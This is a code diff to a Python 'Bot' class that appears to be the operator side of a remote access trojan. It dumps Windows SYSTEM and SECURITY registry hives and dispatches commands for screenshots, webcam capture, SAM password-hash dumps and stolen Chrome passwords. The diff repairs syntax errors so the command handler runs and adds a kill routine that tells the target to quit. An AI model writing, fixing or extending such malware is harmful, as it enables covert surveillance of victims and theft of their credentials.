@@ -211,9 +211,7 @@ class Bot:
             with open('SYSTEM_dump', 'wb') as f:
                 f.write(system_data)
             with open('SECURITY_dump', 'wb') as f:
-                f.write(security_data)
-
-        
+                f.write(security_data)        
 
     def communication(self):
         screenshot_count = 0
@@ -237,11 +235,11 @@ class Bot:
                 self.screenshot(screenshot_count)
                 screenshot_count += 1
             elif command[:6] == 'webcam':
-                self.(webcam_count)
+                self.webcam(webcam_count)
                 webcam_count += 1
             elif command[:12] == 'get_sam_dump':
                 self.handle_sam_dump(command)
-            elif command[:11] = "chrome_pass":
+            elif command[:11] == "chrome_pass":
                 result = self.reliable_recv(target)
                 print(result)
             elif command == 'help':
@@ -250,7 +248,6 @@ class Bot:
                 result = self.reliable_recv()
                 print(result)
 
-
-
-
-    
+    def kill(self):
+        self.reliable_send(target, 'quit')
+        self.target.close()
